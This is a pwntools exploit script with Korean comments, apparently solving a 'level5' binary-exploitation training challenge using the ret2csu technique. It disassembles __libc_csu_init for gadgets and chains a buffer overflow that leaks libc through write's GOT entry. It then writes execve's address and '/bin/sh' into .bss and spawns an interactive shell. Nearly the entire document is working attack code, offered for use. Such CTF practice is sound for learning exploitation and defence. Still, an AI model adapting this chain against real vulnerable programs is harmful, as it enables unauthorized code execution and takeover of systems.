from pwn import *

'''
고생을 너무 많이 했다. 그래서 이번엔 확정적인 녀석을 가져왔다.
확실히 기록을 남길거다.

아래는 ret2csu를 위한 가젯 모음이다.

00000000004005a0 <__libc_csu_init>:
  4005a0:       48 89 6c 24 d8          mov    QWORD PTR [rsp-0x28],rbp
  4005a5:       4c 89 64 24 e0          mov    QWORD PTR [rsp-0x20],r12
  4005aa:       48 8d 2d 73 08 20 00    lea    rbp,[rip+0x200873]        # 600e24 <__init_array_end>
  4005b1:       4c 8d 25 6c 08 20 00    lea    r12,[rip+0x20086c]        # 600e24 <__init_array_end>
  4005b8:       4c 89 6c 24 e8          mov    QWORD PTR [rsp-0x18],r13
  4005bd:       4c 89 74 24 f0          mov    QWORD PTR [rsp-0x10],r14
  4005c2:       4c 89 7c 24 f8          mov    QWORD PTR [rsp-0x8],r15
  4005c7:       48 89 5c 24 d0          mov    QWORD PTR [rsp-0x30],rbx
  4005cc:       48 83 ec 38             sub    rsp,0x38
  4005d0:       4c 29 e5                sub    rbp,r12
  4005d3:       41 89 fd                mov    r13d,edi
  4005d6:       49 89 f6                mov    r14,rsi
  4005d9:       48 c1 fd 03             sar    rbp,0x3
  4005dd:       49 89 d7                mov    r15,rdx
  4005e0:       e8 1b fe ff ff          call   400400 <_init>
  4005e5:       48 85 ed                test   rbp,rbp
  4005e8:       74 1c                   je     400606 <__libc_csu_init+0x66>
  4005ea:       31 db                   xor    ebx,ebx
  4005ec:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
  4005f0:       4c 89 fa                mov    rdx,r15
  4005f3:       4c 89 f6                mov    rsi,r14
  4005f6:       44 89 ef                mov    edi,r13d
  4005f9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  4005fd:       48 83 c3 01             add    rbx,0x1
  400601:       48 39 eb                cmp    rbx,rbp
  400604:       75 ea                   jne    4005f0 <__libc_csu_init+0x50>
  400606:       48 8b 5c 24 08          mov    rbx,QWORD PTR [rsp+0x8]
  40060b:       48 8b 6c 24 10          mov    rbp,QWORD PTR [rsp+0x10]
  400610:       4c 8b 64 24 18          mov    r12,QWORD PTR [rsp+0x18]
  400615:       4c 8b 6c 24 20          mov    r13,QWORD PTR [rsp+0x20]
  40061a:       4c 8b 74 24 28          mov    r14,QWORD PTR [rsp+0x28]
  40061f:       4c 8b 7c 24 30          mov    r15,QWORD PTR [rsp+0x30]
  400624:       48 83 c4 38             add    rsp,0x38
  400628:       c3                      ret    
  400629:       0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]



'''

context.binary = elf = ELF('./level5')
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"
libc = elf.libc

def slog(n, a): return success(': '.join([n, hex(a)]))

p = process()
buf2ret = 0x88

write_got = elf.got["write"]
read_got = elf.got["read"]
main_addr = elf.sym["main"]
bss_base  = elf.bss()
csu_front = 0x4005f0
csu_end = 0x400606

def csu(rbx, rbp, r12, r13, r14, r15, last):
    # rbx 0
    # rbp 1
    # r12, call point
    # rdi=edi=13
    # rsi=r14
    # rdx=r15
    pay = b'\x90'*buf2ret
    pay += p64(csu_end)
    pay += p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    pay += p64(csu_front)
    pay += b'\x90'*0x38
    pay += p64(last)
    p.send(pay)
    sleep(1)

p.recvuntil(b'Hello, World\n')
csu(0, 1, write_got, 1, write_got, 8, main_addr)

leak = u64(p.recv(8))
lb = leak - libc.sym["write"]
execve = lb + libc.sym["execve"]

slog("write_addr", leak)
slog("libc_base", lb)
slog("execve", execve)

p.recvuntil(b'Hello, World\n')
csu(0, 1, read_got, 0, bss_base, 16, main_addr)
p.send(p64(execve) + b'/bin/sh\x00')

p.recvuntil(b'Hello, World\n')
csu(0, 1, bss_base, bss_base+0x8, 0, 0, main_addr)

p.interactive()